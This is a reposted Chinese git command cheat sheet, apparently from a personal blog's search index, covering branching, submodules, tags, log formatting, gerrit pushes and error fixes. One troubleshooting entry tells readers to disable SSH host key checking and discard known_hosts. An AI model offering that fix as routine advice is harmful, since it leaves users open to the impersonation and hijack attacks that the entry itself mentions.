的节点，分一个新的分支gh-pages出来，并切换到 gh-pages ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:7","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"diff git diff file # 查看指定文件的差异 git diff --stat # 查看简单的diff结果 git diff # 比较 Worktree 和 Index 之间的差异 git diff --cached # 比较Index和HEAD之间的差异 git diff HEAD # 比较Worktree和HEAD之间的差异 git diff branch # 比较Worktree和branch之间的差异 git diff branch1 branch2 # 比较两次分支之间的差异 git diff commit commit # 比较两次提交之间的差异 git diff master..test # 上面这条命令只显示两个分支间的差异 git diff master...test # 你想找出‘master’,‘test’的共有 父分支和'test'分支之间的差异，你用3个‘.'来取代前面的两个'.' ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:8","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"stash 存储当前的修改，但不用提交 commit git stash # 将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。 git stash -u # 保存当前状态，包括 untracked 的文件 git stash list # 查看保存的工作现场 git stash apply # 恢复工作现场 git stash drop # 删除stash内容 git stash clear # 删除所有的 stash git stash pop # 恢复的同时直接删除stash内容 git stash apply stash@{0} # 恢复指定的工作现场，当你保存了不只一份工作现场时。 git checkout \u003cstash@{n}\u003e -- \u003cfile-path\u003e # 从 stash 中拿出某个文件的修改 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:9","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"merge git merge --squash test # 合并压缩，将test上的commit压缩为一条 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:10","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"cherry-pick git cherry-pick commit # 拣选合并，将commit合并到当前分支 git cherry-pick -n commit # 拣选多个提交，合并完后可以继续拣选下一个提交 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:11","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"rebase git rebase master # 将master分之上超前的提交，变基到当前分支 git rebase --onto master 169a6 # 限制回滚范围，rebase当前分支从169a6以后的提交 git rebase --interactive # 交互模式，修改commit git rebase --continue # 处理完冲突继续合并 git rebase --skip # 跳过 git rebase --abort # 取消合并 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:6:12","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"分支branch ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"删除 git push origin :branchName # 删除远程分支 git push origin --delete new # 删除远程分支new git branch -d branchName # 删除本地分支，强制删除用-D git branch -d test # 删除本地test分支 git branch -D test # 强制删除本地test分支 git remote prune origin # 远程删除了，本地还能看到远程存在，这条命令删除远程不存在的分支 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:1","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"提交 git push -u origin branchName # 提交分支到远程origin主机中 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:2","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"拉取 git fetch -p # 拉取远程分支时，自动清理 远程分支已删除，本地还存在的对应同名分支。 git fetch origin '+refs/heads/*:refs/heads/*' # 更新所有分支内容 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:3","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"分支合并 git merge branchName # 合并分支 - 将分支branchName和当前所在分支合并 git merge origin/master # 在本地分支上合并远程分支。 git rebase origin/master # 在本地分支上合并远程分支。 git merge test # 将test分支合并到当前分支 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:4","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"重命名 git branch -m old new # 重命名分支 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:5","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"查看 git branch # 列出本地分支 git branch -r # 列出远端分支 git branch -a # 列出所有分支 git branch -v # 查看各个分支最后一个提交对象的信息 git branch --merge # 查看已经合并到当前分支的分支 git branch --no-merge # 查看为合并到当前分支的分支 git remote show origin # 可以查看remote地址，远程分支 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:6","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"新建 git branch test # 新建test分支 git branch newBrach 3defc69 # 指定哈希3defc69，新建分支名字为newBrach git checkout -b newBrach origin/master # 取回远程主机的更新以后，在它的基础上创建一个新的分支 git checkout -b newBrach 3defc69 # 以哈希值3defc69，新建 newBrach 分支，并切换到该分支 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:7","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"连接 git branch --set-upstream dev origin/dev # 将本地dev分支与远程dev分支之间建立链接 git branch --set-upstream master origin/next # 手动建立追踪关系 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:8","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"分支切换 git checkout - # 快速切换分支上一个分支 git checkout test # 切换到test分支 git checkout -b test # 新建+切换到test分支 git checkout -b test dev # 基于dev新建test分支，并切换 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:7:9","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"远端 git fetch \u003c远程主机名\u003e \u003c分支名\u003e # fetch取回所有分支（branch）的更新 git fetch origin remotebranch[:localbranch] # 从远端拉去分支[到本地指定分支] git merge origin/branch # 合并远端上指定分支 git pull origin remotebranch:localbranch # 拉去远端分支到本地分支 git push origin branch # 将当前分支，推送到远端上指定分支 git push origin localbranch:remotebranch # 推送本地指定分支，到远端上指定分支 git push origin :remotebranch # 删除远端指定分支 git checkout -b [--track] test origin/dev # 基于远端dev分支，新建本地test分支[同时设置跟踪] ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:8:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"submodule 克隆项目同时克隆 submodule git clone https://github.com/jaywcjlove/handbook.git --depth=1 --recurse-submodules 克隆项目，之后再手动克隆 submodule 子项目 git submodule add -b gh-pages --force '仓库地址' '路径' git submodule add --force '仓库地址' '路径' # 其中，仓库地址是指子模块仓库地址，路径指将子模块放置在当前工程下的路径。 # 注意：路径不能以 / 结尾（会造成修改不生效）、不能是现有工程已有的目录（不能順利 Clone） git submodule init # 初始化 submodule git submodule update # 更新submodule(必须在根目录执行命令) git submodule update --init --recursive # 下载的工程带有submodule git submodule update --recursive --remote # 对于 git 1.8.2 或更高版本，添加了选项 --remote 以支持更新远程分支 git pull --recurse-submodules # 更新 submodule git 1.7.3 版本 当使用git clone下来的工程中带有submodule时，初始的时候，submodule的内容并不会自动下载下来的，此时，只需执行如下命令： git submodule foreach --recursive git submodule init ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:9:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"更新 submodule git submodule foreach git pull # submodule 里有其他的 submodule 一次更新 git submodule foreach git pull origin master # submodule更新 git submodule foreach --recursive git submodule update git submodule update --recursive --remote git pull --recurse-submodules git submodule deinit --all -f # 清理 submodule ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:9:1","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"删除 submodule git ls-files --stage \u003c子项目名称路径\u003e # 查看子项目 vim .gitmodules # 删除对应的 submodule vim .git/config # 删除对应的 submodule git rm --cached \u003c子模块名称\u003e # 删除缓存中的子项目，注意没有 `/` git rm --cached subProjectName rm -rf project/subProjectName rm .git/module/* # 删除模块下的子模块目录，每个子模块对应一个目录，注意只删除对应的子模块目录即可 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:9:2","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"转换分支 $ git config -f .gitmodules submodule.public.branch gh-pages 下面是更改 .gitmodules 文件内容 [submodule \"public\"] path = public url = git@github.com:jaywcjlove/gitke.git branch = gh-pages ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:9:3","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"删除文件 git rm -rf node_modules/ ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:10:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"remote git是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。个人开发时，多源用的可能不多，但多源其实非常有用。 git remote add origin1 git@github.com:yanhaijing/data.js.git git remote # 显示全部源 git remote -v # 显示全部源+详细信息 git remote rename origin1 origin2 # 重命名 git remote rm origin # 删除 git remote show origin # 查看指定源的全部信息 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:11:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"标签tag 当开发到一定阶段时，给程序打标签是非常棒的功能。 git tag -a v0.1 -m 'my version 1.4' # 新建带注释标签 git push origin --tags # 一次性推送所有分支 git push origin v1.5 # 推送单个tag到orgin源上 git tag -v v1.4.2.1 # 验证标签，验证已经签署的标签 git show v1.5 # 看到对应的 GPG 签 git tag # 列出现有标签 git tag v0gi.1 # 新建标签 git checkout tagname # 切换到标签 git tag -d v0.1 # 删除标签 git push origin :refs/tags/v0.1 # 删除远程标签 git pull --all # 获取远程所有内容包括tag git --git-dir='\u003c绝对地址\u003e/.git' describe --tags HEAD # 查看本地版本信息 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:12:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"重命名Tag mv .git/refs/tags/1.9.1 .git/refs/tags/v1.9.1 git push -f --tags ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:12:1","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"日志log git config format.pretty oneline # 显示历史记录时，每个提交的信息只显示一行 git config color.ui true # 彩色的 git 输出 git log # 查看最近的提交日志 git log --grep=224 # 这条命令是查看含有 \"224\" 关键字的 git commit git log --pretty=oneline # 单行显示提交日志 git log --graph --pretty=oneline --abbrev-commit git log -num # 显示第几条log（倒数） git reflog # 查看所有分支的所有操作记录 git log --since=1.day # 一天内的提交；你可以给出各种时间格式，比如说具体的某一天（“2008-01-15”），或者是多久以前（“2 years 1 day 3 minutes ago”）。 git log --pretty=\"%h - %s\" --author=自己的名字 # 查看自己的日志 git log -p -2 # 展开两次更新显示每次提交的内容差异 git log --stat # 要快速浏览其他协作者提交的更新都作了哪些改动 git log --pretty=format:\"%h - %an, %ar : %s\"# 定制要显示的记录格式 git log --pretty=format:'%h : %s' --date-order --graph # 拓扑顺序展示 git log --pretty=format:'%h : %s - %ad' --date=short # 日期YYYY-MM-DD显示 git log --pretty=oneline --graph --decorate --all # 展示简化的 commit 历史 git log \u003clast tag\u003e HEAD --pretty=format:%s # 只显示commit git config --global format.pretty '%h : %s - %ad' --date=short #日期YYYY-MM-DD显示 写入全局配置 选项 说明 选项 说明 %H 提交对象（commit）的完整哈希字串 %ad 作者修订日期（可以用 -date= 选项定制格式） %h 提交对象的简短哈希字串 %ar 作者修订日期，按多久以前的方式显示 %T 树对象（tree）的完整哈希字串 %cn 提交者(committer)的名字 %t 树对象的简短哈希字串 %ce 提交者的电子邮件地址 %P 父对象（parent）的完整哈希字串 %cd 提交日期 %p 父对象的简短哈希字串 %cr 提交日期，按多久以前的方式显示 %an 作者（author）的名字 %s 提交说明 %ae 作者的电子邮件地址 - - Pretty Formats ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:13:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"重写历史 git commit --amend # 改变最近一次提交 git rebase -i HEAD~3 # 修改最近三次的提交说明，或者其中任意一次 git commit --amend # 保存好了，这些指示很明确地告诉了你该干什么 git rebase --continue # 修改提交说明，退出编辑器。 pick f7f3f6d changed my name a bit pick 310154e updated README formatting and added blame pick a5f4a0d added cat-file 改成 pick 310154e updated README formatting and added blame pick f7f3f6d changed my name a bit ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:14:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"其它 git help * # 获取命令的帮助信息 git status # 获取当前的状态，非常有用，因为git会提示接下来的能做的操作 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:15:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"报错问题解决 1. git fatal: protocol error: bad line length character: No s 解决办法：更换remote地址为 http/https 的 2. The requested URL returned error: 403 Forbidden while accessing 解决github push错误的办法： #vim 编辑器打开 当前项目中的config文件 vim .git/config #修改 [remote \"origin\"] url = https://github.com/jaywcjlove/example.git #为下面代码 [remote \"origin\"] url = https://jaywcjlove@github.com/jaywcjlove/example.git 3. git status 显示中文问题 在查看状态的时候 git status 如果是中文就显示下面的情况 \\344\\272\\247\\345\\223\\201\\351\\234\\200\\346\\261\\202 解决这个问题方法是： git config --global core.quotepath false 4. The authenticity of host 192.168.0.xxx can’t be establis 修改 /etc/ssh/ssh_config 中的 StrictHostKeyChecking 的 ask 为 no 解决问题。 5. SSH连接时出现 Host key verification failed 的原因及解决方法 用 OpenSSH 的人都知 ssh 会把你每个你访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH 会核对公钥。如果公钥不同，OpenSSH 会发出警告，避免你受到 DNS Hijack 之类的攻击。 SSH 对主机的 public_key 的检查等级是根据 StrictHostKeyChecking=no # 最不安全的级别，当然也没有那么多烦人的提示了，相对安全的内网测试时建议使用。如果连接server的key在本地不存在，那么就自动添加到文件中（默认是known_hosts），并且给出一个警告。 StrictHostKeyChecking=ask # 默认的级别，就是出现刚才的提示了。如果连接和key不匹配，给出提示，并拒绝登录。 StrictHostKeyChecking=yes # 最安全的级别，如果连接与key不匹配，就拒绝连接，不会提示详细信息。 【解决方法1】在 .ssh/config（或者/etc/ssh/ssh_config）中配置： StrictHostKeyChecking no UserKnownHostsFile /dev/null 解决方法 2 vi ~/.ssh/known_hosts # 删除对应ip的相关rsa信息 rm known_hosts # 或者直接全部删除 5. insufficient permission for adding an object to repository database .git/objects cd .git/objects ls -al sudo chown -R yourname:yourgroup * ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:16:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"github上传本地项目 git init //把这个目录变成Git可以管理的仓库 git add README.md //文件添加到仓库 git add . //不但可以跟单一文件，还可以跟通配符，更可以跟目录。一个点就把当前目录下所有未追踪的文件全部add了 git commit -m \"first commit\" //把文件提交到仓库 git remote add origin git@github.com:wangjiax9/practice.git //关联远程仓库 git push -u origin master //把本地库的所有内容推送到远程库上 在github上创建仓库，如：go-file-json-server，空项目无任何文件 准备好本地项目目录，如：go-file-json-server 本地执行git命令 # go-file-json-server项目目录下 git init git add . git commit -am \"first create commit\" git branch -M main git remote add origin git@github.com:bingerambo/go-file-json-server.git git push -u origin main ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:17:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"git命令汇总 # 检查修改状态 git status -s # 根据状态， add 修改和添加文件 git add aaa/install_config/instant.yaml # 再做检查 git status -s # commit代码 git commit -m'unbuntu install driver' # push到分支 git push origin bugfix/ds-yaml-hostNetwork-remove # 再做检查 git status -s # 切换分支 git checkout develop # 切换分支， 如出现 head detached at xxx，使用下面命令 git checkout --track origin/v1.12 # 从分支pull git pull origin feature/infiniband-driver # 查看log git log # 展开内容差异 git log -p # 查看差别 git diff # 取消本地修改 ##文件修改不丢失 git reset -- filename ## 文件修改丢失 git checkout -- filename # 删除本地分支 git branch -d branckname # 强制删除本地分支 git branch -D branckname # 删除本地文件目录文件 git rm -r xxx ## 下载指定版本代码 git clone https://github.com/kubernetes/kubernetes.git cd kubernetes git log git branch git checkout xxx ## 回退版本 ### 1.1 暂存区版本回退至仓库HEAD位置 git reset HEAD filename ### 1.2让工作区版本回退 git checkout -- filename ### 2.1 仓库和暂存区版本回退 git reset --hard commit_id # 删除文件 把仓库和暂存区已有文件删除 ## 删除工作区文件 git rm filename ## 同步暂存区和仓库 git commit -m\"delete filename ...\" ## 新建项目后的 git更新项目操作 # git add -A 添加所有变化 # git add -u 添加被修改(modified)和被删除(deleted)文件，不包括新文件(new) # git add . 添加新文件(new)和被修改(modified)文件，不包括被删除(deleted)文件 # git add * git add -A git commit -m \"k8s1.14.8modify init\" git push -u origin master git commit -m \"kubelet topologymanager with numa align\" git push -u origin master ## gerrit 方式 git push -u orgin develop:refs/for/develop ### 有时push会报错，按提示输入以下命令执行 #### step1:把上面红色的那条gitidir复制下来执行下： ####gitdir=$(git rev-parse --git-dir); scp -p -P 29418 zhangmiao@review.rnd.meizu.com:hooks/commit-msg ${gitdir}/hooks/ gitdir=$(git rev-parse --git-dir); scp -p -P 29418 wangb.in@100.7.36.68:hooks/commit-msg ${gitdir}/hooks/ #### step2:执行下面的命令会添加change_id git commit --amend #### step3:然后推送代码到服务器上 ####git push origin HEAD:refs/for/$branch_name git push -u orgin develop:refs/for/develop ### 常用git操作 #### 拉取远程分支 git checkout --track oprgin/branchname #### 删除远程分支 git push origin --delete feat/xxxbranchname #### 撤销commit，保持本地修改 git reset HEAD~ #### 撤销mr #在提交的分支上执行 git revert ### git branch -r git fetch origin git branch -r git checkout --track origin/geekbang/01 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:18:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"git操作命令示例 ################################################################## ################################################################## ################################################################## # 查看当前分支 git branch # 查看所有分支 git branch -a # 创建分支，并切换检出 git checkout -b feat/device-install git checkout -b bugfix/client-timeout git checkout -b feature/add-compile-inspect-tool # 检查修改状态 git status -s # 根据状态，add 修改和添加的文件 git add aistation2.0/install_config/inspur.yml # 再做检查 git status -s # commit代码 git commit -m 'ubuntu isntall infiniband driver' # push到分支 git push origin feature/infiniband-driver git push origin bugfix/ds-yaml-hostNetwork-remove # 再做检查 git status -s # 切换分支 git checkout develop # 切换分支 如出现head detached at xxx，使用下面命令 git checkout --track origin/v1.12 # 从分支pull git pull origin feature/infiniband-driver # 查看log git log ## 展开内容差异 git log -p # 查看差别 git diff # 取消本地修改 ## 文件修改不丢失 git reset -- filename ## 文件修改丢失 git checkout -- filename # 删除本地分支 git branch -d branchname # 强制删除本地分支 git branch -D branchname # 删除本的文件目录文件 git rm -r xxx http://100.2.50.206/AIStation/rdma-sriov-dev-plugin.git # 撤销commit 保持本地已修改 git reset --soft 18c85d87066139c30faabe1bf3e72ee89224d383 # gerrit 命令 git commit -am \"bugfix：解决显存复用场景下sprad策略不生效问题。\" # git push -u origin 